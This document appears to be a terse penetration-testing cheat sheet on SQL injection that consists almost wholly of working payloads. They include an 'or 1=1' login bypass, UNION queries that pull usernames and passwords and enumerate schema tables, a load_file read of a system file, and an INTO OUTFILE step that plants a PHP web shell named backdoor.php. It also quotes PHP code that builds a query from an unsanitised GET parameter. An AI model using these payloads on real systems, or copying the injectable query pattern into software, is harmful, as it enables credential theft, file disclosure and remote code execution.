### Identifying SQL Injection Vulnerabilities
```
select * from users where name = 'tom' or 1=1;#' and password = 'jones';
```

### Authentication Bypass
```
Some programming languages have functions that query the database and expect a single record. If these functions get more than one row, they will generate an error
select * from users where name = 'tom' or 1=1 LIMIT 1;#

source-code:$sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id'];
http://url/debug.php?id=1+UNION+SELECT+id,username,password,flag,time+FROM+users
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```

### From SQL Injection to Code Execution
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
